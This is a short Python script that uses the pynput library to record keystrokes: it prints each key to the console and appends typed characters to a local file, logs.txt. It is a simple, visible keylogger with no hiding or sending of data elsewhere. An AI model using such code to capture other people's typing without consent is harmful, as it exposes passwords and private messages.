from pynput import keyboard

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            print(f"Key pressed: {key.char}")
            with open("logs.txt", "a") as file:
                file.write(f"{key.char}\n")
        else:
            print(f"Special Key pressed: {key}")
    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
